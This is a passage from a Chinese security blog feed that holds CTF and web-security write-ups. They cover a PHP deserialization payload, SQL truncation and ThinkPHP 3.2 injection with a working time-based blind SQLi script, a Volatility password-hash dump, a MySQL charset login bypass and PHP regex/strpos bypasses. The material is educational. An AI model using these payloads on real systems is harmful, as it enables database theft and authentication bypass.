class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a-&gt;bbb = &amp;$a-&gt;aaa;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><pre><code>于是$amazing = O:4:&quot;baby&quot;:3:{s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:{s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;}s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;}</code></pre><p>最终payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing=<span class="string">'O:4:"baby":3:&#123;s:9:"&lt;0x00&gt;*&lt;0x00&gt;skyobj";O:4:"cool":3:&#123;s:8:"filename";N;s:4:"nice";N;s:6:"amzing";N;&#125;s:3:"aaa";N;s:3:"bbb";R:6;&#125;'</span>; </span></span><br><span class="line"><span class="php">&#125;   </span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php"><span class="comment">// $a-&gt;bbb =&amp;$a-&gt;aaa;</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (serialize($a));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h2><p><strong>考点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql约束攻击</span><br><span class="line">TP注入</span><br></pre></td></tr></table></figure><p>通过用御剑扫描,发现<br>robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span>: *</span><br><span class="line"></span><br><span class="line"><span class="attribute">Disallow</span>: /ebooks</span><br><span class="line"><span class="attribute">Disallow</span>: /admin</span><br><span class="line"><span class="attribute">Disallow</span>: /xhtml/?</span><br><span class="line"><span class="attribute">Disallow</span>: /center</span><br></pre></td></tr></table></figure><p>发现有登录和注册页面</p><p><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6n33ovwj30hd08ptct.jpg" alt="在这里插入图片描述">进行注册后，然后进行登录却提示：<br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl6t155omj30h404jgli.jpg" alt="在这里插入图片描述"><br>然后我们注册admin的账户<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6v0u7l9j30gk04xweg.jpg" alt="在这里插入图片描述"><br>却提示用户已存在，那么现在可以想到注册部分有两个数据库查询操作:先select检测用户名是否存在，若不存在就进行数据库插入操作，若存在就注册失败。登录界面可能是select查询用户名和密码是否正确。这样一般攻击者就会进行注入测试，但是这里并不是想让攻击者在这注入然后拿到admin的密码，来看注册部分的代码select方法使用预处理机制+tp自带的转义，insert部分addslashes转义后入库，那么注册部分基本就不可能注入了。</p><p>在创建字段的时候 如果指定了 字段的长度 可以用sql约束攻击进行绕过<br>学习理解sql约束攻击可以参考这篇文章<br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a></p><p>接下来注册账户admin              ‘ (中间有n个空格)，密码11111111</p><p>注册登入成功 发现是一个搜索框<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6vtehy6j30hb076wef.jpg" alt="在这里插入图片描述"></p><p>发现是ThinkPHP3.2 框架<br>百度谷歌搜索 发现有此框架的sql注入漏洞<br>利用参数传入数组类型数据导致绕过过滤导致sql注入</p><p>具体参考:<br><a href="https://xz.aliyun.com/t/2629#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629#toc-2</a></p><p>?search[table]=flag where 1 and polygon(id)–<br>分别得到数据库名 表明 字段名</p><p><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl6wx8637j30he0323yo.jpg" alt="在这里插入图片描述"><br>发现字段名是flag</p><pre><code>http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--</code></pre><p>进行盲注测试 成功延迟<br>exp如下:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">flag</span> = <span class="string">''</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'re4g49sil8hfh4ovfrk7ln1o02'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+<span class="built_in">str</span>(i)+<span class="string">',1))='</span>+<span class="built_in">str</span>(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>,cookies=cookies)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">flag</span> += j</span><br><span class="line">            print <span class="built_in">flag</span></span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h2><p><strong>考点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存镜像分析</span><br><span class="line">Volatility 的使用</span><br></pre></td></tr></table></figure><p>Volatility是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Wnidows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。</p><p>volatility 使用：<br>volatility -f &lt;文件名&gt; –profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</p><p>先使用imageinfo插件来猜测dump文件的profile值<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6y3f6oqj30hg04saaw.jpg" alt="在这里插入图片描述"></p><p>得到类型为WinXPSP2x86</p><p>列举缓存在内存的注册表,找到system和sam key的起始位置 ：</p><pre><code>hivelist -f memory -profile=WinXPSP2x86</code></pre><p><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl70b5q9tj30he04gmyf.jpg" alt="在这里插入图片描述"></p><p>选择系统版本, 提取镜像用户信息</p><pre><code>volatility -f memory --profile=WinXPSP2x86 hashdump</code></pre><p>获得Administrator的NThash:c22b315c040ae6e0efee3518d830362b</p><p>得到密码123456789<br>MD5后提交</p><h2 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h2><p><strong>考点</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">foremost</span> 的使用</span><br><span class="line"><span class="keyword">binwalk </span> 的使用</span><br><span class="line"><span class="symbol">stegsolve</span> 的使用</span><br></pre></td></tr></table></figure><p>用foremost或者binwalk分离得到一张二维码<br>再用stegsolve进行分析得到flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h2 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h2><p><strong>考点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWERTY键盘与Dvorak键盘</span><br></pre></td></tr></table></figure><p>百度了一下 了解一下<br>就是该用QWERTY键盘还是Dvorak键盘<br>具体可看<br><a href="http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html</a><br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl72dg5ztj30hi0a2juu.jpg" alt="在这里插入图片描述"><br>QWERTY键盘<br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl738hwmfj30ih069gnw.jpg" alt="在这里插入图片描述"><br>由ypau_kjg;”g;”ypau+  根据映射关系 可得到flag<br>在线解密网址<br><a href="http://wbic16.xedoloh.com/dvorak.html" target="_blank" rel="noopener">http://wbic16.xedoloh.com/dvorak.html</a><br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl73yh2y7j30i509rmzh.jpg" alt="在这里插入图片描述"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/170341" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170341</a><br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a><br><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629</a><br><a href="https://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">https://www.freebuf.com/column/152545.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysql字符编码利用技巧</title>
      <link href="/2019/01/12/Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/01/12/Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>造成这种漏洞的原因是<br>Mysql字段的字符集和php mysqli客户端设置的字符集不相同。</p><h2 id="MySQL字符集介绍"><a href="#MySQL字符集介绍" class="headerlink" title="MySQL字符集介绍"></a>MySQL字符集介绍</h2><p>MySQL服务器可以支持多种字符集，在同一台服务器，同一个数据库，甚至同一个表的不同字段都可以指定使用不同的字符集，相比oracle等其他数据库管理系统，在同一个数据库只能使用相同的字符集，MySQL明显存在更大的灵活性。<br>MySQL提供了不同级别的设置，包括server级、database级、table级、column级，可以提供非常精准的设置。<br>我们在进行编写php文件的时候</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$mysqli</span> = new mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"cat"</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">"Connect failed: %s\n"</span>, <span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="string">"set names utf8"</span>);</span><br></pre></td></tr></table></figure><p>设置了字符集为UTF-8<br>set names utf8 的意思是将客户端的字符集设置为utf8<br>在mysql可以查看<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-12/64138853.jpg" alt=""><br>如上图，在默认情况下，mysql字符集为latin1，而执行了set names utf8;以后，character_set_client、character_set_connection、character_set_results等与客户端相关的配置字符集都变成了utf8，但character_set_database、character_set_server等服务端相关的字符集还是latin1。</p><p>这就是该Trick的核心，因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql在执行查询的时候，就涉及到字符集的转换。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL Server收到请求时将请求数据从character_<span class="keyword">set</span>_client</span><br><span class="line">转换为character_<span class="keyword">set</span>_connection；</span><br><span class="line">进行内部操作前将请求数据从character_<span class="keyword">set</span>_connection转换为内部操作字符集</span><br></pre></td></tr></table></figure><h1 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($username === <span class="string">'admin'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Permission denied!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$result = $mysqli-&gt;query(<span class="string">"SELECT * FROM z_users where username = '&#123;$username&#125;' and password = '&#123;$password&#125;'"</span>);</span></span><br></pre></td></tr></table></figure><p>if语句嫌疑很大，大概是考我们怎么登陆admin的账号</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在我们这个案例中，character_set_client和character_set_connection被设置成了utf8，而内部操作字符集其实也就是username字段的字符集还是默认的latin1。于是，整个操作就有如下字符串转换过程：</p><p>utf8 –&gt; utf8 –&gt; latin1</p><p>最后执行比较username=’admin’的时候，’admin’是一个latin1字符串。<br>Mysql在转换字符集的时候，将不完整的字符给忽略了。<br>举个简单的例子，佬这个汉字的UTF-8编码是\xE4\xBD\xAC，我们可以依次尝试访问下面三个URL：</p><pre><code>http://localhost:9090/test.php?username=admin%e4http://localhost:9090/test.php?username=admin%e4%bdhttp://localhost:9090/test.php?username=admin%e4%bd%ac</code></pre><p>可以发现，前两者都能成功获取到username=admin的结果，而最后一个URL，也就是当我输入佬字完整的编码时，将会失败：</p><p><strong>为什么会抛出错误？</strong><br>原因很简单，因为latin1并不支持汉字，所以utf8汉字转换成latin1时就抛出了错误。</p><p>那前两次为什么没有抛出错误？因为前两次输入的编码并不完整，Mysql在进行编码转换时，就将其忽略了。</p><p>这个特点也导致，我们查询username=admin%e4时，%e4被省略，最后查出了username=admin的结果。</p><h2 id="只有部分字符可以使用"><a href="#只有部分字符可以使用" class="headerlink" title="只有部分字符可以使用"></a>只有部分字符可以使用</h2><p>我在测试这个Trick的时候发现，username=admin%c2时可以正确得到结果，但username=admin%c1就不行，这是为什么？<br>简单fuzz了一下，如果在admin后面加上一个字符，有如下结果：</p><pre><code>\x00~\x7F： 返回空白结果\x80~\xC1： 返回错误Illegal mix of collations\xC2~\xEF： 返回admin的结果\xF0~\xFF： 返回错误Illegal mix of collations</code></pre><h2 id="实战二"><a href="#实战二" class="headerlink" title="实战二"></a>实战二</h2><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-12/67794247.jpg" alt=""><br>同理是这个if语句</p><pre><code>比较$row[&apos;id&apos;]和$id的区别</code></pre><p>令id=%c2 即可</p><h2 id="实战三"><a href="#实战三" class="headerlink" title="实战三"></a>实战三</h2><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>使用MySQL字符集时的建议</p><p>建立数据库/表和进行数据库操作时尽量显式指出使用的字符集，而不是依赖于MySQL的默认设置，否则MySQL升级时可能带来很大困扰；</p><p>• 数据库和连接字符集都使用latin1时虽然大部分情况下都可以解决乱码问题，但缺点是无法以字符为单位来进行SQL操作，一般情况下将数据库和连接字符集都置为utf8是较好的选择；</p><p>• 使用mysql C API时，初始化数据库句柄后马上用mysql_options设定MYSQL_SET_CHARSET_NAME属性为utf8，这样就不用显式地用 SET NAMES语句指定连接字符集，且用mysql_ping重连断开的长连接时也会把连接字符集重置为utf8；</p><p>• 对于mysql PHP API，一般页面级的PHP程序总运行时间较短，在连接到数据库以后显式用SET NAMES语句设置一次连接字符集即可；但当使用长连接时，请注意保持连接通畅并在断开重连后用SET NAMES语句显式重置连接字符集。</p><p>其他注意事项<br>• my.cnf中的default_character_set设置只影响mysql命令连接服务器时的连接字符集，不会对使用libmysqlclient库的应用程序产生任何作用！</p><p>• 对字段进行的SQL函数操作通常都是以内部操作字符集进行的，不受连接字符集设置的影响。</p><p>• SQL语句中的裸字符串会受到连接字符集或introducer设置的影响，对于比较之类的操作可能产生完全不同的结果，需要小心！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysql字符编码利用技巧</a><br><a href="http://www.laruence.com/2008/01/05/3192.html" target="_blank" rel="noopener">深入Mysql字符集设置</a><br><a href="https://www.leavesongs.com/PENETRATION/Mini-XCTF-Writeup.html" target="_blank" rel="noopener">XCTF两道web题目的writeup</a></p><p><a href="https://www.jb51.net/article/132521.htm" target="_blank" rel="noopener">带你5分钟读懂MySQL字符集设置</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018·i春秋圣诞欢乐赛官方WriteUp</title>
      <link href="/2019/01/12/2018%C2%B7i%E6%98%A5%E7%A7%8B%E5%9C%A3%E8%AF%9E%E6%AC%A2%E4%B9%90%E8%B5%9B%E5%AE%98%E6%96%B9WriteUp/"/>
      <url>/2019/01/12/2018%C2%B7i%E6%98%A5%E7%A7%8B%E5%9C%A3%E8%AF%9E%E6%AC%A2%E4%B9%90%E8%B5%9B%E5%AE%98%E6%96%B9WriteUp/</url>
      
        <content type="html"><![CDATA[<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>打开页面<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/41923075.jpg" alt=""></p><p>考点: snow html隐写</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snow</span> 是一款在html嵌入隐写信息的软件，</span><br><span class="line">它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，</span><br><span class="line">不同空格与制表位的组合代表不同的嵌入信息。</span><br></pre></td></tr></table></figure><p>解密网址：<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a><br>密钥为题目名字<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/37624188.jpg" alt=""></p><h2 id="gift-php"><a href="#gift-php" class="headerlink" title="gift php"></a>gift php</h2><p>Do you know .swp file? 非正常关闭vi编辑器时会生成一个.swp文件<br>访问.index.php.swp下载下来， vim-r.index.php.swp还原即可 源码 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span><span class="params">($greeting)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/Merry.*Christmas/is'</span>,$greeting);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$greeting=@$_POST[<span class="string">'greeting'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!areyouok($greeting))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strpos($greeting,<span class="string">'Merry Christmas'</span>)!==<span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Merry Christmas. '</span>.<span class="string">'flag&#123;****&#125;'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Do you know .swp file?'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Do you know PHP?'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>要求post一个 greeting参数，经过areyouok函数正则过滤后如果返回false，<br>就进入下一个if，如果 greeting参数包含 MerryChristmas则打印flag。<br>可以利用strpos函数的一个漏洞，传入一个数组，会返回 NULL， NULL不强等于false，即可绕过。<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/41317872.jpg" alt=""></p><h2 id="gift-php-plus"><a href="#gift-php-plus" class="headerlink" title="gift php plus"></a>gift php plus</h2><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/59998626.jpg" alt=""><br>这题是在gift php的基础上加上了is_array的判断，不允许使用数组来绕过。</p><p>所以上一道题的思路不能再用了。 这里需要用到正则回溯，可以参考p牛的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限 pcre.backtrack_limit，默认为100万。当正则回溯超过这个上限时，就会返回false。 </p><p>因此我们只要post100万个字符，让它回溯大于100万次，函数就会返回false，从而绕过if判断。 </p><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/10130370.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>大二上学期期末C++课程设计</title>
      <link href="/2019/01/12/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%ABC-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
      <url>/2019/01/12/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%ABC-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目一矩阵运算"><a href="#题目一矩阵运算" class="headerlink" title="题目一矩阵运算"></a>题目一矩阵运算</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 